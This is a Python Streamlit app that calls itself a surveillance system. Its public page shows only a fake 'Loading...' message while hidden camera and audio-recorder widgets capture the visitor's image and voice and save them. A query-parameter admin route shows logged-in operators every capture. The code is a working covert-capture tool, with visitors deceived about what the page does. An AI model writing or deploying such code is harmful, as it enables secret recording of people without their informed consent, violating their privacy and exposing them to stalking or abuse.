import streamlit as st
import cv2
import numpy as np
from datetime import datetime
import os
from audio_recorder_streamlit import audio_recorder
from utils import is_admin, require_admin
from storage import save_capture, get_all_captures

# Page config
st.set_page_config(
    page_title="Surveillance System",
    page_icon="🎥",
    layout="wide"
)

# Initialize session state
if 'authenticated' not in st.session_state:
    st.session_state.authenticated = False

def capture_page():
    st.title("Loading...")
    
    # Hidden capture elements
    img_capture = st.camera_input("", label_visibility="hidden")
    audio_bytes = audio_recorder(
        pause_threshold=2.0,
        sample_rate=41_000,
        text="",
        recording_color="#ff4b4b",
        neutral_color="#ffffff"
    )

    if img_capture is not None:
        # Save the captured image
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        save_capture(img_capture, audio_bytes, timestamp)
        
        # Show a loading message
        st.markdown("""
            <div style='text-align: center; font-size: 24px;'>
                Loading... Please wait
            </div>
        """, unsafe_allow_html=True)

def admin_login():
    st.title("Admin Login")
    
    username = st.text_input("Username")
    password = st.text_input("Password", type="password")
    
    if st.button("Login"):
        if is_admin(username, password):
            st.session_state.authenticated = True
            st.experimental_rerun()
        else:
            st.error("Invalid credentials")

def admin_dashboard():
    st.title("Admin Dashboard")
    
    if st.button("Logout"):
        st.session_state.authenticated = False
        st.experimental_rerun()
    
    # Get all captures
    captures = get_all_captures()
    
    st.subheader(f"Total Captures: {len(captures)}")
    
    # Display captures
    for capture in captures:
        with st.expander(f"Capture {capture['timestamp']}"):
            col1, col2 = st.columns(2)
            
            with col1:
                st.image(capture['image'], caption="Captured Image")
            
            with col2:
                if capture['audio']:
                    st.audio(capture['audio'], format="audio/wav")
                else:
                    st.write("No audio recorded")
                
                st.text(f"Timestamp: {capture['timestamp']}")

def main():
    # Check if accessing admin route
    path = st.experimental_get_query_params().get("path", [None])[0]
    
    if path == "admin":
        if not st.session_state.authenticated:
            admin_login()
        else:
            admin_dashboard()
    else:
        capture_page()

if __name__ == "__main__":
    main()
